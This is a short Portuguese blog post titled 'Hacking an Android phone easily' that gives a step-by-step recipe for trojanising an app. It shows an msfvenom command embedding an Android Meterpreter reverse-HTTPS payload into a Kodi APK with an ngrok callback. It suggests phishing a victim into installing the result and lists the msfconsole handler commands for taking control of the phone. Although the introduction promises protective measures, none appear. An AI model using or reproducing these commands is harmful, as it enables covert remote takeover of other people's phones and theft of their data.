---
layout: post
title: Hackeando um celular com Android facilmente
subtitle: Estratégias de Hackeamento em Dispositivos Android
cover-img: /assets/img/path.jpg
thumbnail-img: /assets/img/celular.jpg
share-img: /assets/img/path.jpg
tags: [Android]
---

 Métodos de Intrusão

Introdução:
O avanço tecnológico trouxe consigo não apenas comodidade, mas também desafios significativos em termos de segurança cibernética. Um dos temas mais prementes nesse contexto é o hackeamento de celulares. Este ensaio explora não apenas os métodos utilizados por hackers, mas também destaca medidas cruciais para proteger a privacidade e a segurança digital.

existem muitas ferramentas por ai poderosa mas aqui vai um exemplo,uma ferramenta simples e de codigo aberto com um apk em mãos e um simples comando podemos gerar uma copia identica de qualquer apk.

graças ao metasploit framework: vou usar kodi como exemplo

~~~

msfvenom -x kodi-20.2-Nexus-armeabi-v7a.apk -p android/meterpreter/reverse_https LHOST=ngrok LPORT=443 -o backdored.apk

~~~

agora tudo que precisamos é fazer a vitima instalar esse apk nao vou abordar isso nesse topico porque existem muitas maneiras de enganar alguem phishing,etc

depois disso toda vez que quisermos controlar a vitima basta abrir msfconsole e preparar o ambiente.


~~~

use multi/handler

set lhost ngrok

set lport 443

set payload android/meterpreter/reverse_https

run

~~~
 

fim!!!








